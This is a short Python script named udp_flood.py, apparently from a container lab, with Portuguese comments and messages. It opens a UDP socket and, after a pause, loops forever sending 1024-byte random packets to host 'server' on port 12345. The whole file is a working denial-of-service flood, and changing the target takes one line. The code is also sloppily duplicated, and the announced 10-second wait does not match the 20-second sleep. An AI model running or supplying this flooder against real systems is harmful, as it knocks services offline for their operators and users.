# udp_flood.py
import socket
import random
import time

server_ip = "server"  # Substitua pelo IP do container ou use o nome "server"
port = 12345
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# udp_flood.py


print("Aguardando 10 segundos antes de iniciar o ataque UDP...")
time.sleep(20)

server_ip = "server"
port = 12345
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

print("Iniciando ataque UDP...")

while True:
    msg = random._urandom(1024)
    sock.sendto(msg, (server_ip, port))


